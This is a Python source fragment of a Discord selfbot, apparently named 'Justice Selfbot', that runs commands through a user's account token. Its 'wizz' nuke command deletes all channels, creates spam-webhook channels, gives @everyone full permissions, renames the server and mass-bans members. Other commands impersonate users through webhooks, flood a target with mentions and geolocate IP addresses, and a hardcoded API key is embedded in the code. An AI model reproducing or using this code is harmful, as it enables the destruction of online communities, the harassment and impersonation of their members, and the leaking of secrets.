            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "Accept": "*/*"
        }

    def change_status(self, status, message, emoji_name=None, emoji_id=None):
        jsonData = {
            "status": status,
            "custom_status": {
                "text": message
            }
        }

        if emoji_name:
            jsonData["custom_status"]["emoji_name"] = emoji_name
        if emoji_id:
            jsonData["custom_status"]["emoji_id"] = emoji_id

        r = requests.patch("https://discord.com/api/v9/users/@me/settings",
                           headers=self.headers,
                           json=jsonData)
        return r.status_code


is_rotating = False
rotation_task = None
statuses = []

def parse_emoji(raw_emoji):
    custom_emoji_match = re.match(r"<a?:([a-zA-Z0-9_]+):(\d+)>", raw_emoji)
    if custom_emoji_match:
        name = custom_emoji_match.group(1)
        emoji_id = custom_emoji_match.group(2)
        return name, emoji_id
    else:
        return raw_emoji, None


@client.command()
async def rotate(ctx, *, status_list: str):
    global is_rotating, rotation_task, statuses

    status_changer = DiscordStatusChanger(client.http.token)

    if is_rotating:
        await stop_rotation(ctx)

    statuses = [s.strip() for s in status_list.split('/') if s.strip()]

    if not statuses:
        await ctx.send("```No valid statuses provided. Use: >rotate 😎 Cool / <:pepe:123> Chill```")
        return

    is_rotating = True

    async def rotation_loop():
        global is_rotating
        try:
            while is_rotating:
                for status_item in statuses:
                    if not is_rotating:
                        break

                    try:
                        emoji, message = status_item.split(' ', 1)
                    except ValueError:
                        emoji, message = "", status_item

                    emoji_name, emoji_id = parse_emoji(emoji)

                    try:
                        status_changer.change_status(
                            "dnd",
                            message.strip(),
                            emoji_name.strip(),
                            emoji_id
                        )
                    except Exception as e:
                        print(f"Error updating status: {e}")

                    await asyncio.sleep(30)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"Loop error: {e}")
            is_rotating = False

    rotation_task = client.loop.create_task(rotation_loop())
    await ctx.send("```ansi\n\u001b[32m✅ Started rotating statuses.\n```")


@client.command(name="stoprotator")
async def stop_rotation(ctx):
    global is_rotating, rotation_task
    if is_rotating:
        is_rotating = False
        if rotation_task:
            rotation_task.cancel()
        await ctx.send("```ansi\n\u001b[31m❌ Stopped status rotation.\n```")
    else:
        await ctx.send("```ansi\n\u001b[31m❓ No active rotation to stop.\n```")


@client.command()
async def hook(ctx, user: discord.Member, *, message):
    if not ctx.author.guild_permissions.manage_webhooks:
        print("You do not have permissions to manage webhooks in that server.")
        await ctx.message.delete()
        return
    
    channel = ctx.channel
    avatar_url = user.avatar_url
    bytes_of_avatar = bytes(requests.get(avatar_url).content)
    webhook = await channel.create_webhook(name=f"{user.display_name}", avatar=bytes_of_avatar)
    print(user.display_name)
    webhook_url = webhook.url 
    WebhookObject = Webhook(webhook_url)
    WebhookObject.send(message)
    WebhookObject.delete()
    

@client.command()
async def autoreaction(ctx, user: discord.User, emoji: str):
    autoreact_users[user.id] = emoji
    await ctx.send(f"```Now auto-reacting with {emoji} to {user.name}'s messages```")

@client.command()
async def reactionoff(ctx, user: discord.User):
    if user.id in autoreact_users:
        del autoreact_users[user.id]
        await ctx.send(f"```Stopped auto-reacting to {user.name}'s messages```")
    else:
        await ctx.send("```This user doesn't have autoreact enabled```")


@client.command()
async def mimic(ctx, user: discord.User):
    if not hasattr(client, 'mimic_tasks'):
        client.mimic_tasks = {}
        
    if user.id in client.mimic_tasks:
        client.mimic_tasks[user.id].cancel()
        del client.mimic_tasks[user.id]
        await ctx.send(f"```Stopped mimicking {user.name}```")
        return

    headers = {
        "authorization": client.http.token,
        "content-type": "application/json"
    }

    last_message_id = None
    cached_messages = {}
    
    blocked_content = [
        "underage", "minor", "year old", "yo", "years old",
        "10", "11", "9", "8", "7", "6", "5", "4", "3", "1", "2",
        "12", "13", "14", "mute",
        "/kick", "/mute", ".kick", ".mute",
        "-kick", "-mute", "$kick", "ban",
        "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten",
        "eleven", "twelve", "thirteen", "self-bot", "self bot",
        "nsfw", "porn", "hentai", "nude", "nudes"
    ]

    async def mimic_task():
        nonlocal last_message_id
        
        while user.id in client.mimic_tasks:
            try:
                params = {'after': last_message_id} if last_message_id else {'limit': 1}
                response = requests.get(
                    f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages",
                    headers=headers,
                    params=params
                )
                
                if response.status_code == 200:
                    messages = response.json()
                    
                    for msg in reversed(messages):
                        if msg['author']['id'] == str(user.id):
                            content = msg.get('content', '').lower()
                            
                            if any(word in content for word in blocked_content):
                                continue
                            
                            content = msg.get('content', '')
                            
                            while content.startswith('.'):
                                content = content[1:].lstrip()  
                            
                            if not content:
                                continue
                                
                            if content[:3].count('.') > 1:
                                continue

                            if content.startswith(('!', '?', '-', '$', '/', '>', '<')):
                                continue
                            
                            if not content and msg.get('referenced_message'):
                                content = f"Reply to: {msg['referenced_message'].get('content', '[Content Hidden]')}"
                            elif not content and msg.get('mentions'):
                                content = f"Mentioned: {', '.join(m['username'] for m in msg['mentions'])}"
                            elif not content:
                                if msg.get('embeds'):
                                    embed = msg['embeds'][0]
                                    content = embed.get('description', embed.get('title', '[Embed]'))
                                elif msg.get('attachments'):
                                    content = '[' + ', '.join(a['filename'] for a in msg['attachments']) + ']'
                                else:
                                    continue
                                    
                            if any(word in content.lower() for word in blocked_content):
                                continue
                            
                            if msg['id'] not in cached_messages:
                                cached_messages[msg['id']] = True
                                
                                payload = {
                                    "content": content,
                                    "tts": False
                                }
                                
                                if msg.get('embeds'):
                                    payload['embeds'] = msg['embeds']
                                
                                requests.post(
                                    f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages",
                                    headers=headers,
                                    json=payload
                                )
                                
                                await asyncio.sleep(0.5)
                            
                            last_message_id = msg['id']
                            
            except Exception as e:
                print(f"Mimic Error: {e}")
                
            await asyncio.sleep(1)

    task = client.loop.create_task(mimic_task())
    client.mimic_tasks[user.id] = task
    await ctx.send(f"```Started mimicking {user.name}```")

gcspam_protection_enabled = False
red = "\033[31m"
cyan = "\033[36m"

@client.command()
async def antigc(ctx):
    global gcspam_protection_enabled
    gcspam_protection_enabled = not gcspam_protection_enabled

    if gcspam_protection_enabled:
        await ctx.send(f"```ansi\nGroup chat spam protection is now {cyan}enabled.```")
    else:
        await ctx.send(f"```ansi\nGroup chat spam protection is now {red}disabled.```")

@client.event
async def on_private_channel_create(channel):
    if gcspam_protection_enabled and isinstance(channel, discord.GroupChannel):
        try:
            headers = {
                'Authorization': client.http.token,
                'Content-Type': 'application/json'
            }
            params = {
                'silent': 'true'
            }
            async with aiohttp.ClientSession() as session:
                async with session.delete(f'https://discord.com/api/v9/channels/{channel.id}', headers=headers, params=params) as resp:
                    if resp.status == 200:
                        print(f"left group chat silently: {channel.id}")
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get("Retry-After", 1))
                        print(f"Rate limited. Retrying after {retry_after} seconds...")
                        await asyncio.sleep(retry_after)
                    else:
                        print(f"Failed to leave group chat. Status code: {resp.status}")
        except Exception as e:
            print(f"Error leaving group DM: {e}")


@client.group(invoke_without_command=True)
async def autopressure(ctx, user: discord.User = None):
    if ctx.invoked_subcommand is None:
        if not user:
            await ctx.send("```Please mention a user```")
            return

        if not autopress_config["messages"]:
            await ctx.send("```No messages configured. Use .autopress add <message> to add messages```")
            return

        autopress_status[ctx.author.id] = {
            'running': True,
            'target': user,
            'channel': ctx.channel
        }

        used_messages = set()
        messages_sent = 0

        print(f"\n=== Starting Autopress Command ===")
        print(f"Target User: {user.name}")

        async def send_message():
            nonlocal used_messages, messages_sent

            available_messages = [msg for msg in autopress_config["messages"] if msg not in used_messages]
            if not available_messages:
                used_messages.clear()
                available_messages = autopress_config["messages"]
                print("\n=== Refreshing message list ===\n")

            message = random.choice(available_messages)
            used_messages.add(message)

            try:
                send_channel = autopress_status[ctx.author.id]['channel']
                full_message = f"{message} {user.mention}"
                await send_channel.send(full_message)
                messages_sent += 1
                print(f"Message sent ({messages_sent}): {full_message}")

            except Exception as e:
                print(f"\nError sending message: {str(e)}")

        try:
            while ctx.author.id in autopress_status and autopress_status[ctx.author.id]['running']:
                await send_message()
                # No sleep at all for maximum speed, but beware of rate limits
                await asyncio.sleep(0.01)

        except Exception as main_error:
            print(f"Main loop error: {main_error}")

        finally:
            autopress_status.pop(ctx.author.id, None)

        print("\n=== Autopress Stopped ===\n")


@autopressure.command(name="add")
async def add_message(ctx, *, message: str):
    autopress_config["messages"].append(message)
    save_config()
    await ctx.send(f"```Added message: {message}```")

@autopressure.command(name="remove")
async def remove_message(ctx, index: int):
    messages = autopress_config["messages"]
    if not messages:
        await ctx.send("```No messages configured```")
        return

    if 1 <= index <= len(messages):
        removed = messages.pop(index - 1)
        save_config()
        await ctx.send(f"```Removed message: {removed}```")
    else:
        await ctx.send("```Invalid index. Use .autopress list to see message indices```")


@autopressure.command(name="list")
async def list_messages(ctx):
    messages = autopress_config["messages"]
    if not messages:
        await ctx.send("```No messages configured```")
        return

    message_list = "\n".join(f"{i+1}. {msg}" for i, msg in enumerate(messages))
    await ctx.send(f"```Configured messages:\n\n{message_list}```")

@autopressure.command(name="clear")
async def clear_messages(ctx):
    autopress_config["messages"].clear()
    save_config()
    await ctx.send("```Cleared all messages```")

@client.command
async def stoppressure(ctx):
    if ctx.author.id in autopress_status:
        autopress_status[ctx.author.id]['running'] = False
        await ctx.send("```Autopress stopped.```")
    else:
        await ctx.send("```No autopress session is currently running.```")

@client.command()
async def ip(ctx, ip: str):
    
    api_url = f"http://ip-api.com/json/{ip}"
    
    try:
        response = requests.get(api_url)
        data = response.json()

        if data['status'] == 'fail':
            await ctx.send(f"Error: {data['message']}")
            return

        
        ip_info = f"""
```ansi
 [37m               𖦏   IP  INFORMATION   🗺
``````ansi
[34m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⢙⡦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠁⣰⣆⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠠⡧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````ansi
[35m< 𒅒 >                                         < 𒅒 >
``````js
[01] IP           - {data['query']}
[02] Country      - {data['country']}
[03] Region       - {data['regionName']}
[04] City         - {data['city']}
[05] ZIP          - {data['zip']}
[06] Latitude     - {data['lat']}
[07] Longitude    - {data['lon']}
[08] ISP          - {data['isp']}
[09] Organization - {data['org']}
[10] AS           - {data['as']}
```"""

        await ctx.send(ip_info)
    
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
# Error Iddar na iss nuker ko fast krdio use apiv10 if necessary and aur ek baat wizz command pr massban pehle hona chiye phir baaki saab.
config_file = "nuke_config.json"


default_config = {
    "webhook_message": "@everyone JOIN https://discord.gg/9K56C4qKSk Server Fucked By Justice Selfbot",
    "server_name": "Fucked By Syntax",
    "webhook_delay": 0.3,
    "channel_name": "justice-selfbot"  
}

def load_configs():
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            return json.load(f)
    else:
        save_config(default_config)
        return default_config

def save_config(config):
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=4)

configss = load_configs()

async def try_action(action):
    try:
        return await action()
    except discord.Forbidden:
        return None
    except Exception as e:
        print(f"Error during action: {e}")
        return None

async def send_webhooks(webhook, total_webhook_messages):
    while total_webhook_messages < 5000:
        await webhook.send(configss["webhook_message"])  
        total_webhook_messages += 1
        await asyncio.sleep(configss["webhook_delay"])

@client.command()
async def nukehook(ctx, *, new_message):
    configss["webhook_message"] = new_message
    save_config(configss)
    await ctx.send(f"```Webhook message changed to: {new_message}```")

@client.command()
async def hookclear(ctx):
    configss["webhook_message"] = "https://discord.gg/9K56C4qKSk"
    save_config(configss)
    await ctx.send("```Webhook message cleared and reset to default.```")

@client.command()
async def nukename(ctx, *, new_name):
    configss["server_name"] = new_name
    save_config(configss)
    await ctx.send(f"```Server name changed to: {new_name}```")

@client.command()
async def nukedelay(ctx, delay: float):
    if delay <= 0:
        await ctx.send("```Please enter a number for the delay.```")
        return
    configss["webhook_delay"] = delay
    save_config(configss)
    await ctx.send(f"```Webhook delay changed to: {delay} seconds.```")

@client.command()
async def nukechannel(ctx, *, new_channel_name):
    configss["channel_name"] = new_channel_name
    save_config(configss)
    await ctx.send(f"```Webhook channel name changed to: {new_channel_name}```")

webhook_spam = True

@client.command()
async def wizz(ctx):
    global webhook_spam

    if ctx.guild.id == 1167459192026714122:
        await ctx.send("```This command is disabled for this server.```")
        return

    if not configss:
        await ctx.send("```No configuration found. Do you want to use the default settings? Type 'yes' to continue or 'no' to cancel.```")

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        try:
            msg = await client.wait_for('message', check=check, timeout=30.0)
            if msg.content.lower() == "yes":
                configss.update({
                    "webhook_message": "@everyone JOIN https://discord.gg/9K56C4qKSk Server Fucked By Justice Selfbot",
                    "server_name": "Fucked By Syntax",
                    "webhook_delay": 0.3,
                    "channel_name": "justice-selfbot"
                })
            elif msg.content.lower() == "no":
                await ctx.send("```Operation cancelled.```")
                await ctx.send(f"""```js
[01] nukehook    - Change the webhook message for the nuke process.
[02] nukename    - Change the Discord server name for the nuke process.
[03] nukedelay   - Change the delay between webhook messages.
[04] nukechannel - Change the channel name used for the webhook.```""")
                return
            else:
                await ctx.send("```Invalid response. Operation cancelled.```")
                return
        except asyncio.TimeoutError:
            await ctx.send("```Operation timed out. Command cancelled.```")
            return

    await ctx.send("```Are you sure you want to run this command? Type 'yes' to continue.```")
    
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel
    
    try:
        msg = await client.wait_for('message', check=check, timeout=30.0)
        if msg.content.lower() != "yes":
            await ctx.send("```Operation cancelled.```")
            return
    except asyncio.TimeoutError:
        await ctx.send("```Operation timed out. Command cancelled.```")
        return
    
    await ctx.send("```Destruction process starting...```")

    async def spam_webhook(webhook):
        while webhook_spam:
            try:
                await webhook.send(content=configss["webhook_message"])
                await asyncio.sleep(configss["webhook_delay"])
            except:
                break

    async def create_webhook_channel(i):
        try:
            channel = await ctx.guild.create_text_channel(f"/{configss['channel_name']} {i+1}")
            webhook = await channel.create_webhook(name="Syntax Papa")
            asyncio.create_task(spam_webhook(webhook))
            return True
        except:
            return False

    async def delete_channel(channel):
        try:
            if not channel.name.startswith(f"/{configss['channel_name']}"):
                await channel.delete()
            return True
        except:
            return False

    async def massban_members():
        await ctx.guild.chunk()
        members = [m for m in ctx.guild.members if m != ctx.guild.me]
        banned_count = 0
        semaphore = asyncio.Semaphore(10)

        async def ban_member(member):
            async with semaphore:
                for attempt in range(3):
                    try:
                        await member.ban(reason="Syntax X Error")
                        return True
                    except:
                        await asyncio.sleep(0.5)
                return False

        tasks = [asyncio.create_task(ban_member(member)) for member in members]
        results = await asyncio.gather(*tasks)
        banned_count = sum(1 for r in results if r)
        return banned_count

    async def execute_destruction():
        try:
            await asyncio.gather(*[delete_channel(c) for c in ctx.guild.channels])

            for i in range(100):
                await create_webhook_channel(i)
                await asyncio.sleep(0.1)

            try:
                await ctx.guild.edit(name=configss["server_name"])
            except:
                pass

            try:
                everyone_role = ctx.guild.default_role
                await everyone_role.edit(permissions=discord.Permissions.all())
            except:
                pass

            banned = await massban_members()
            return banned
        except:
            return -1

    try:
        banned_count = await execute_destruction()
        await ctx.send(f"```Destruction process completed. Webhook spam is ongoing. Banned {banned_count} members.```")
    except:
        await ctx.send("```An error occurred during destruction.```")
    finally:
        await ctx.send("```Justice destruction completed.```")
# webhook spam ka stop command hai !
@client.command()
async def stopspam(ctx):
    global webhook_spam
    webhook_spam = False
    await ctx.send("```Stopping all spam tasks...```")

guild_rotation_task = None
guild_rotation_delay = 2.0  

@client.group(invoke_without_command=True)
async def rotateguild(ctx, delay: float = 2.0):
    global guild_rotation_task, guild_rotation_delay
    
    if guild_rotation_task and not guild_rotation_task.cancelled():
        await ctx.send("```tag rotation is already running```")
        return
        
    if delay < 1.0:
        await ctx.send("```tag must be at least 1 second```")
        return
        
    guild_rotation_delay = delay
    
    async def rotate_guilds():
        headers = {
            "authority": "canary.discord.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": client.http.token,
            "content-type": "application/json",
            "origin": "https://canary.discord.com",
            "referer": "https://canary.discord.com/channels/@me",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    valid_guild_ids = []
                    
                    async with session.get(
                        'https://canary.discord.com/api/v9/users/@me/guilds',
                        headers=headers
                    ) as guild_resp:
                        if guild_resp.status != 200:
                            await ctx.send("```Failed to fetch guilds```")
                            return
                        
                        guilds = await guild_resp.json()
                        
                        for guild in guilds:
                            test_payload = {
                                'identity_guild_id': guild['id'],
                                'identity_enabled': True
                            }
                            
                            async with session.put(
                                'https://canary.discord.com/api/v9/users/@me/clan',
                                headers=headers,
                                json=test_payload
                            ) as test_resp:
                                if test_resp.status == 200:
                                    valid_guild_ids.append(guild['id'])
                        
                        if not valid_guild_ids:
                            await ctx.send("```No guilds with valid clan badges found```")
                            return
                            
                        await ctx.send(f"```Found {len(valid_guild_ids)} guilds```")
                        
                        while True:
                            for guild_id in valid_guild_ids:
                                payload = {
                                    'identity_guild_id': guild_id,
                                    'identity_enabled': True
                                }
                                async with session.put(
                                    'https://canary.discord.com/api/v9/users/@me/clan',
                                    headers=headers,
                                    json=payload
                                ) as put_resp:
                                    if put_resp.status == 200:
                                        await asyncio.sleep(guild_rotation_delay)
                            
            except asyncio.CancelledError:
                raise
            except Exception as e:
                print(f"Error in guild rotation: {e}")
                await asyncio.sleep(5)
    
    guild_rotation_task = asyncio.create_task(rotate_guilds())
    await ctx.send(f"```Started guild rotation (Delay: {delay}s)```")

@rotateguild.command(name="stop")
async def rotateguild_stop(ctx):    
    global guild_rotation_task
    
    if guild_rotation_task and not guild_rotation_task.cancelled():
        guild_rotation_task.cancel()
        guild_rotation_task = None
        await ctx.send("```Stopped clan rotation```")
    else:
        await ctx.send("```Clan rotation is not running```")

@rotateguild.command(name="delay")
async def rotateguild_delay(ctx, delay: float):
    global guild_rotation_delay
    
    if delay < 1.0:
        await ctx.send("```Delay must be at least 1 second```")
        return
        
    guild_rotation_delay = delay
    await ctx.send(f"```Clan rotation delay set to {delay}s```")

@rotateguild.command(name="status")
async def rotateguild_status(ctx):
    status = "running" if (guild_rotation_task and not guild_rotation_task.cancelled()) else "stopped"
    await ctx.send(f"""```
Guild Rotation Status:
• Status: {status}
• Delay: {guild_rotation_delay}s
```""")

@client.command()
async def chatgpt(ctx, *, query: str = None):
    if not query:
        await ctx.send("Please provide a query for the AI.")
        return


    API_URL = "https://api.groq.com/openai/v1/chat/completions"
    API_KEY = "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"  

 
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }

    payload = {
        "model": "llama3-8b-8192",  
        "messages": [
            {"role": "system", "content": "You are a helpful AI assistant."},
            {"role": "user", "content": query}
        ],
        "temperature": 0.7,
        "max_tokens": 500
    }

  
    await ctx.trigger_typing()

    try:
   
        async with aiohttp.ClientSession() as session:
            async with session.post(API_URL, headers=headers, json=payload) as response:
                if response.status == 200:
                    data = await response.json()
                    
                   
                    ai_response = data['choices'][0]['message']['content']

                  
                    if len(ai_response) > 2000:
                    
                        chunks = [ai_response[i:i+2000] for i in range(0, len(ai_response), 2000)]
                        for chunk in chunks:
                            await ctx.send(chunk)
                    else:
                        await ctx.send(ai_response)
                else:
                    error_text = await response.text()
                    await ctx.send(f"API Error: {response.status} - {error_text}")

    except aiohttp.ClientError as e:
        await ctx.send(f"Network error occurred: {e}")
    except Exception as e:
        await ctx.send(f"An unexpected error occurred: {e}")


@chatgpt.error
async def chatgpt_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Please provide a query after the command.")


@client.command()
async def imagen(ctx, *, prompt):
    """
    Generate an image quickly using multiple AI image generation services
    
    :param ctx: Discord command context
    :param prompt: Text description for image generation
    """
    
    image_services = [
        f"https://image.pollinations.ai/prompt/{urllib.parse.quote(prompt)}",
        f"https://image.pollinations.ai/p/{urllib.parse.quote(prompt)}",
        f"https://lexica.art/prompt/{urllib.parse.quote(prompt)}"
    ]
    
    try:
        
        try:
            await ctx.message.delete()
        except:
            pass
        

        loading_msg = await ctx.send("🖼️ Generating image...")
        
       
        async with aiohttp.ClientSession() as session:

            for url in image_services:
                try:
                    async with session.get(url, timeout=10) as response:
                        if response.status == 200:
              
                            await loading_msg.edit(content=url)
                            return
                except Exception as e:
                    continue
            

            await loading_msg.edit(content="❌ Image generation failed. Please try again.")
    
    except Exception as e:

        await ctx.send(f"Error: {str(e)}")

async def fetch_with_timeout(session, url, timeout=10):
    try:
        async with session.get(url, timeout=timeout) as response:
            return await response.text()
    except asyncio.TimeoutError:
        return None

@client.command()
async def tts(ctx, *, text: str = None):
    """
    Text-to-Speech command using Google Text-to-Speech
    
    Args:
        ctx (discord.Context): The context of the command
        text (str, optional): Text to convert to speech
    """
   
    if not text:
        await ctx.send("Please provide text for text-to-speech.")
        return

    
    await ctx.trigger_typing()

    try:
     
        audio_filename = f"tts_{uuid.uuid4()}.mp3"

       
        tts = gTTS(text=text, lang='en')
        
        
        tts.save(audio_filename)

        
        await ctx.send(f"Audio for: {text}", file=discord.File(audio_filename))

        
        os.remove(audio_filename)

    except Exception as e:
        await ctx.send(f"Error in TTS generation: {str(e)}")

@client.command()
async def tts_langs(ctx):
    """
    List available languages for Text-to-Speech
    """
    # Dictionary of language codes and their names
    languages = {
        'af': 'Afrikaans', 'sq': 'Albanian', 'ar': 'Arabic', 'hy': 'Armenian', 
        'bn': 'Bengali', 'bs': 'Bosnian', 'ca': 'Catalan', 'zh': 'Chinese', 
        'hr': 'Croatian', 'cs': 'Czech', 'da': 'Danish', 'nl': 'Dutch', 
        'en': 'English', 'et': 'Estonian', 'fi': 'Finnish', 'fr': 'French', 
        'de': 'German', 'el': 'Greek', 'hi': 'Hindi', 'hu': 'Hungarian', 
        'is': 'Icelandic', 'id': 'Indonesian', 'it': 'Italian', 'ja': 'Japanese', 
        'km': 'Khmer', 'ko': 'Korean', 'la': 'Latin', 'lv': 'Latvian', 
        'mk': 'Macedonian', 'ne': 'Nepali', 'no': 'Norwegian', 'pl': 'Polish', 
        'pt': 'Portuguese', 'ro': 'Romanian', 'ru': 'Russian', 'sr': 'Serbian', 
        'si': 'Sinhala', 'sk': 'Slovak', 'es': 'Spanish', 'sw': 'Swahili', 
        'sv': 'Swedish', 'ta': 'Tamil', 'th': 'Thai', 'tr': 'Turkish', 
        'uk': 'Ukrainian', 'ur': 'Urdu', 'vi': 'Vietnamese', 'cy': 'Welsh'
    }

    # Format language list
    lang_list = "\n".join([f"{code}: {name}" for code, name in languages.items()])
    
    # Send language list
    await ctx.send(f"Available Languages:\n{lang_list}")

@client.command()
async def tts_lang(ctx, lang_code: str = 'en', *, text: str = None):
    """
    Text-to-Speech with specific language
    
    Args:
        ctx (discord.Context): The context of the command
        lang_code (str): Language code
        text (str): Text to convert to speech
    """
    # Check if text is provided
    if not text:
        await ctx.send("Please provide text for text-to-speech.")
        return

    try:
        # Generate unique filename
        audio_filename = f"tts_{uuid.uuid4()}.mp3"

        # Create gTTS object with specified language
        tts = gTTS(text=text, lang=lang_code)
        
        # Save the audio file
        tts.save(audio_filename)

        # Send audio file
        await ctx.send(f"Audio in {lang_code} language for: {text}", file=discord.File(audio_filename))

        # Clean up the audio file
        os.remove(audio_filename)

    except ValueError:
        await ctx.send(f"Invalid language code. Use !tts_langs to see available languages.")
    except Exception as e:
        await ctx.send(f"Error in TTS generation: {str(e)}")

@tts.error
@tts_lang.error
async def tts_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Please provide text to convert to speech. Usage: >tts <your text>")

def get_ltc_balance(address):
    """Retrieve the LTC balance for a given address from BlockCypher API."""
    url = f'https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance'
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        balance = data['final_balance'] / 1_000_000 
        return f"{balance:.8f}"  
    except requests.RequestException as e:
        return f"Error retrieving balance: {e}"

@client.command()
async def ltc_balance(ctx, address):
    """View LTC balance from a given address."""
    balance = get_ltc_balance(address)
    await ctx.send(f"LTC balance for address {address}: {balance} LTC")

@client.command(aliases=['si', 'server'])
async def serverinfo(ctx):
    guild = ctx.guild
    
    def time_since(past_date):
        now = datetime.utcnow()
        diff = now - past_date
        
        years = diff.days // 365
        months = (diff.days % 365) // 30
        days = (diff.days % 365) % 30
        
        time_parts = []
        if years > 0:
            time_parts.append(f"{years} year{'s' if years > 1 else ''}")
        if months > 0:
            time_parts.append(f"{months} month{'s' if months > 1 else ''}")
        if days > 0:
            time_parts.append(f"{days} day{'s' if days > 1 else ''}")
        
        return f"{' '.join(time_parts)} ago" if time_parts else "just now"

    server_info = f"""```ansi
[35m⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⡀⠀⠀⠀⡀⠠⢐⠂⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣰⡦⢄⠀⠀⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⣠⣀⣀⣀⣀⡀⠀⠀⠀
⠀⠾⣿⣦⡈⣀⣉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠀⠀⣀⣠⡴⠊
⠀⠀⠘⣿⣷⣿⣯⣄⢀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣯⣤⣶⣿⠿⠋⠀⠀
⠀⠀⠀⢸⣿⣿⣿⡏⠀⢢⣠⣄⡀⠀⣺⣿⡿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⣾⣿⣿⠙⢿⣦⣬⣿⣿⣿⡶⠟⠉⠀⣿⣿⣿⣿⠁⠀⠐⠒⠠⡀
⠀⠀⠀⣿⣿⣿⣄⠆⠙⡻⢿⣿⣿⣷⣶⣶⣾⣿⣿⣿⡶⠂⢀⡀⠤⠌⠀
